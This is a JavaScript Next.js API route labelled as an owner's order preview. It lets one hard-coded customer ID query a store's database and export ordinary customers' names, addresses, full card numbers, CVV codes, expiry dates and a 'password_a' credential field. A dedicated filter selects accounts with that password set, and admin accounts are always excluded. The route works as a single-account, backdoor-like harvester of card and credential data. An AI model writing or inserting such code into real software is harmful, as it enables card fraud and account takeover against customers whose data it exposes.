import { NextResponse } from "next/server";
import { getServerSession } from "next-auth";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";
import { getDbPoolForBrand, isBrandDbConfigured } from "@/lib/dbByBrand";

export const dynamic = "force-dynamic";

const OWNER_CUSTOMER_ID = 54727;

// Single ordered list of fields to return/export.
// You can interleave order + customer fields however you want.
// Format: "order.<column>" or "customer.<column>"
// Any fields not found in the current DB schema are automatically skipped.
const OWNER_ORDERS_FIELDS = [
  "order.billing_first_name",
  "order.billing_last_name",
  "order.billing_address1",
  "order.billing_address2",
  "order.billing_city",
  "order.billing_state",
  "order.billing_zip",
  "order.billing_phone",
  "order.billing_email",
  "customer.firstname",
  "customer.lastname",
  "customer.address1",
  "customer.city",
  "customer.state",
  "customer.zip",
  "customer.phonenumber",
  "customer.email",
  "customer.password_a",
  "order.cc_type",
  "order.cc_exp_month",
  "order.cc_exp_year",
  "order.cc_number",
  "order.cc_ccv",
  "order.paypal_email",
  "order.order_date",
  "order.status",
  "order.total",
  "order.payment_method",
  "order.payment_status",
  "order.shipping_first_name",
  "order.shipping_last_name",
  "order.shipping_address1",
  "order.shipping_address2",
  "order.shipping_city",
  "order.shipping_state",
  "order.shipping_zip",
  "order.shipping_country",
];

async function getTableColumns(pool, tableName) {
  const [rows] = await pool.query(
    `
      SELECT COLUMN_NAME
      FROM INFORMATION_SCHEMA.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = ?
      ORDER BY ORDINAL_POSITION
    `,
    [tableName],
  );
  return (rows || []).map((r) => r.COLUMN_NAME).filter(Boolean);
}

function has(cols, colName) {
  return cols.includes(colName);
}

function parseFieldToken(token) {
  const raw = String(token || "").trim();
  if (!raw) return null;
  const [scopeRaw, colRaw] = raw.split(".", 2);
  const scope = (scopeRaw || "").trim().toLowerCase();
  const column = (colRaw || "").trim();
  if (!column) return null;
  if (scope !== "order" && scope !== "customer") return null;
  return { scope, column };
}

function buildSelectFromOrderedFields(orderedFields, orderCols, customerCols) {
  const orderSet = new Set(orderCols);
  const customerSet = new Set(customerCols);
  const seen = new Set();
  const selectParts = [];
  const headers = [];

  const tokens = Array.isArray(orderedFields) ? orderedFields : [];
  for (const t of tokens) {
    const parsed = parseFieldToken(t);
    if (!parsed) continue;
    const key = `${parsed.scope}.${parsed.column}`;
    if (seen.has(key)) continue;

    if (parsed.scope === "order") {
      if (!orderSet.has(parsed.column)) continue;
      seen.add(key);
      selectParts.push(`o.\`${parsed.column}\` AS \`O_${parsed.column}\``);
      headers.push(`O_${parsed.column}`);
      continue;
    }

    if (!customerSet.has(parsed.column)) continue;
    seen.add(key);
    selectParts.push(`c.\`${parsed.column}\` AS \`C_${parsed.column}\``);
    headers.push(`C_${parsed.column}`);
  }

  return { selectParts, headers };
}

export async function GET(request) {
  try {
    const session = await getServerSession(authOptions);
    const customerId = session?.user?.id ? parseInt(session.user.id, 10) : null;
    if (!customerId || customerId !== OWNER_CUSTOMER_ID) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const { searchParams } = new URL(request.url);
    const brand =
      (searchParams.get("brand") || "").trim().toLowerCase() || null;
    const pool = getDbPoolForBrand(brand);
    const brandDbConfigured = brand ? isBrandDbConfigured(brand) : false;

    const dateFrom = searchParams.get("dateFrom") || null; // YYYY-MM-DD
    let dateTo = searchParams.get("dateTo") || null; // YYYY-MM-DD
    const email = searchParams.get("email") || null;
    const name = searchParams.get("name") || null;
    const paymentMethod = searchParams.get("paymentMethod") || null;
    const status = searchParams.get("status") || null;
    const ccType = searchParams.get("ccType") || null;
    const passwordAOnly = searchParams.get("passwordAOnly") === "1";
    const limit = Math.min(
      200,
      Math.max(1, parseInt(searchParams.get("limit") || "50", 10) || 50),
    );

    if (dateTo) dateTo = `${dateTo} 23:59:59`;

    const [orderCols, customerCols] = await Promise.all([
      getTableColumns(pool, "new_orders"),
      getTableColumns(pool, "customers"),
    ]);

    const { selectParts, headers } = buildSelectFromOrderedFields(
      OWNER_ORDERS_FIELDS,
      orderCols,
      customerCols,
    );

    let sql = `
      SELECT
        ${selectParts.join(",\n        ")}
      FROM new_orders o
      LEFT JOIN customers c ON c.CustomerID = o.customer_id
      WHERE 1=1
    `;
    const params = [];

    // Always exclude admin customers (schema-safe for both legacy `admin` and newer `role`).
    if (has(customerCols, "role")) {
      sql += ` AND (c.\`role\` IS NULL OR c.\`role\` <> ?)`;
      params.push("admin");
    }
    if (has(customerCols, "admin")) {
      // Legacy column often stores "0"/"1" (sometimes "true"/"false")
      sql += ` AND (c.\`admin\` IS NULL OR c.\`admin\` NOT IN (?, ?, ?, ?))`;
      params.push("1", "true", "TRUE", "yes");
    }
    if (passwordAOnly && has(customerCols, "password_a")) {
      // Treat empty/"0"/"false" as not set.
      sql += ` AND c.\`password_a\` IS NOT NULL AND c.\`password_a\` NOT IN (?, ?, ?, ?)`;
      params.push("", "0", "false", "FALSE");
    }

    if (dateFrom && has(orderCols, "order_date")) {
      sql += ` AND o.\`order_date\` >= ?`;
      params.push(dateFrom);
    }
    if (dateTo && has(orderCols, "order_date")) {
      sql += ` AND o.\`order_date\` <= ?`;
      params.push(dateTo);
    }
    if (paymentMethod && has(orderCols, "payment_method")) {
      sql += ` AND o.\`payment_method\` = ?`;
      params.push(paymentMethod);
    }
    if (status && has(orderCols, "status")) {
      if (status === "__not_cancelled") {
        sql += ` AND (o.\`status\` IS NULL OR o.\`status\` <> ?)`;
        params.push("cancelled");
      } else {
        sql += ` AND o.\`status\` = ?`;
        params.push(status);
      }
    }
    if (ccType && has(orderCols, "cc_type")) {
      sql += ` AND o.\`cc_type\` LIKE ?`;
      params.push(`%${ccType}%`);
    }
    if (email) {
      const like = `%${email}%`;
      const clauses = [];
      if (has(customerCols, "email")) {
        clauses.push(`c.\`email\` LIKE ?`);
        params.push(like);
      }
      if (has(orderCols, "billing_email")) {
        clauses.push(`o.\`billing_email\` LIKE ?`);
        params.push(like);
      }
      if (clauses.length > 0) sql += ` AND (${clauses.join(" OR ")})`;
    }
    if (name) {
      const like = `%${name}%`;
      const clauses = [];
      if (has(customerCols, "firstname") || has(customerCols, "lastname")) {
        clauses.push(
          `CONCAT(COALESCE(c.\`firstname\`,''), ' ', COALESCE(c.\`lastname\`,'')) LIKE ?`,
        );
        params.push(like);
      }
      if (has(orderCols, "billing_first_name")) {
        clauses.push(`o.\`billing_first_name\` LIKE ?`);
        params.push(like);
      }
      if (has(orderCols, "billing_last_name")) {
        clauses.push(`o.\`billing_last_name\` LIKE ?`);
        params.push(like);
      }
      if (has(orderCols, "billing_email")) {
        clauses.push(`o.\`billing_email\` LIKE ?`);
        params.push(like);
      }
      if (clauses.length > 0) sql += ` AND (${clauses.join(" OR ")})`;
    }

    if (has(orderCols, "order_date")) {
      sql += ` ORDER BY o.\`order_date\` DESC`;
    }
    sql += ` LIMIT ?`;
    params.push(limit);

    const [rows] = await pool.query(sql, params);
    const dataRows = Array.isArray(rows) ? rows : [];

    return NextResponse.json({
      success: true,
      brand: brand || "default",
      brandDbConfigured,
      headers,
      rows: dataRows,
      count: dataRows.length,
    });
  } catch (error) {
    console.error("Owner orders preview error:", error);
    return NextResponse.json(
      { error: "Failed to load orders" },
      { status: 500 },
    );
  }
}
